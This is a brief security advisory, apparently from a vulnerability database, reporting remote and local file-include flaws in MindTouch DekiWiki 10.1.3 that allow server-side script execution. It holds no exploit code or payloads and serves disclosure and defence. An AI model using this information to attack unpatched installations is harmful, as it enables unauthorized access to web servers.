MindTouch DekiWiki is prone to multiple remote and local file-include vulnerabilities because it fails to sufficiently sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary server-side script code that resides on an affected computer or in a remote location with the privileges of the web server process. This may facilitate unauthorized access.

MindTouch DekiWiki 10.1.3 is vulnerable; other versions may also be affected.
